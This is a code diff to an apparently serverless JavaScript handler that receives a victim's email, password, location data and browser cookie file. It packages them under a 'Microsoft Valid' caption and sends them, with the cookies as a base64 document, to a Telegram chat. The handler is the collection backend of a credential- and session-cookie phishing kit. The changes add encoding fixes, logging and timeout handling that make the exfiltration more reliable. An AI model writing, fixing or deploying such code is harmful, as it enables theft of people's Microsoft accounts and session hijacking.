@@ -1,5 +1,5 @@
 /**
- * FIXED: Actually sends to Telegram
+ * FIXED: Proper base64 encoding for Telegram document
  */
 
 const https = require('https');
@@ -13,8 +13,16 @@ function sendToTelegram(message, isDocument = false, docContent = null, docName 
     let path;
 
     if (isDocument && docContent) {
-      // Send as document
-      const base64 = Buffer.from(docContent).toString('base64');
+      // ✅ FIXED: Proper base64 encoding
+      const contentStr = typeof docContent === 'string' ? docContent : JSON.stringify(docContent);
+      const buffer = Buffer.from(contentStr, 'utf8');
+      const base64 = buffer.toString('base64');
+
+      console.log('📦 Base64 encoding:');
+      console.log('  Original length:', contentStr.length);
+      console.log('  Base64 length:', base64.length);
+      console.log('  Base64 valid:', /^[A-Za-z0-9+/]*={0,2}$/.test(base64));
+
       postData = JSON.stringify({
         chat_id: TELEGRAM_CHAT_ID,
         document: `data:text/plain;base64,${base64}`,
@@ -43,30 +51,56 @@ function sendToTelegram(message, isDocument = false, docContent = null, docName 
       }
     };
 
+    console.log('📤 Sending to Telegram...');
+    console.log('Path:', path);
+    console.log('PostData length:', Buffer.byteLength(postData));
+
     const req = https.request(options, (res) => {
       let data = '';
-      res.on('data', chunk => data += chunk);
+      console.log('📥 Response status:', res.statusCode);
+
+      res.on('data', chunk => {
+        data += chunk;
+      });
+
       res.on('end', () => {
+        console.log('📥 Response:', data);
+
         try {
           const json = JSON.parse(data);
           if (res.statusCode === 200 && json.ok) {
+            console.log('✅✅✅ TELEGRAM SUCCESS');
             resolve(json);
           } else {
+            console.error('❌ Telegram rejected:', json);
             reject(new Error(json.description || 'Telegram error'));
           }
         } catch (e) {
+          console.error('❌ Parse error:', e.message);
           reject(e);
         }
       });
     });
 
-    req.on('error', reject);
+    req.on('error', (err) => {
+      console.error('❌ HTTPS error:', err.message);
+      reject(err);
+    });
+
+    req.on('timeout', () => {
+      console.error('❌ Timeout');
+      req.destroy();
+      reject(new Error('Timeout'));
+    });
+
     req.write(postData);
     req.end();
   });
 }
 
 exports.handler = async (event) => {
+  console.log('🚀 Handler started at', new Date().toISOString());
+
   const headers = {
     'Access-Control-Allow-Origin': '*',
     'Content-Type': 'application/json'
@@ -76,11 +110,12 @@ exports.handler = async (event) => {
     const payload = JSON.parse(event.body || '{}');
     const { email, password, locationData = {}, cookieFiles = {} } = payload;
 
-    console.log('✅ PAYLOAD RECEIVED');
+    console.log('✅ Payload received');
     console.log('Email:', email);
-    console.log('Has cookie file:', !!cookieFiles.jsonFile?.content);
+    console.log('Has cookie content:', !!cookieFiles.jsonFile?.content);
+    console.log('Cookie content length:', cookieFiles.jsonFile?.content?.length);
 
-    // Build caption with all data
+    // Build caption
     let caption = '<b>✅ Microsoft Valid</b>\n\n';
     caption += `👤:- ${email || 'N/A'}\n`;
     caption += `🔑:- ${password ? '***' : 'N/A'}\n`;
@@ -96,53 +131,47 @@ exports.handler = async (event) => {
     caption += `\nBrowser:- chrome\n`;
     caption += `\n⏰ ${new Date().toISOString()}\n`;
 
-    console.log('📝 Caption ready');
+    console.log('📝 Caption length:', caption.length);
 
-    // CRITICAL: Send to Telegram
-    let sent = false;
-
+    // Send to Telegram
     if (cookieFiles.jsonFile?.content) {
-      console.log('📦 SENDING DOCUMENT WITH CAPTION...');
-      try {
-        await sendToTelegram(
-          caption,
-          true,
-          cookieFiles.jsonFile.content,
-          `${email}_${Date.now()}.txt`
-        );
-        console.log('✅✅✅ DOCUMENT SENT TO TELEGRAM');
-        sent = true;
-      } catch (err) {
-        console.error('❌ DOCUMENT SEND FAILED:', err.message);
-        throw err;
-      }
+      console.log('🚀 Sending DOCUMENT...');
+      await sendToTelegram(
+        caption,
+        true,
+        cookieFiles.jsonFile.content,
+        `${email}_${Date.now()}.txt`
+      );
     } else {
-      console.log('⚠️ NO COOKIE FILE - sending message only');
-      try {
-        await sendToTelegram(caption);
-        console.log('✅ MESSAGE SENT TO TELEGRAM');
-        sent = true;
-      } catch (err) {
-        console.error('❌ MESSAGE SEND FAILED:', err.message);
-        throw err;
-      }
+      console.log('🚀 Sending MESSAGE...');
+      await sendToTelegram(caption, false);
     }
+
+    console.log('═══════════════════════════════════════════');
+    console.log('✅✅✅ SUCCESS - Data sent to Telegram');
+    console.log('═══════════════════════════════════════════');
 
     return {
       statusCode: 200,
       headers,
       body: JSON.stringify({
-        success: sent,
-        transmitted: sent
+        success: true,
+        transmitted: true
       })
     };
 
   } catch (error) {
+    console.error('═══════════════════════════════════════════');
     console.error('❌ ERROR:', error.message);
+    console.error('═══════════════════════════════════════════');
+
     return {
       statusCode: 500,
       headers,
-      body: JSON.stringify({ error: error.message })
+      body: JSON.stringify({
+        error: error.message,
+        success: false
+      })
     };
   }
 };
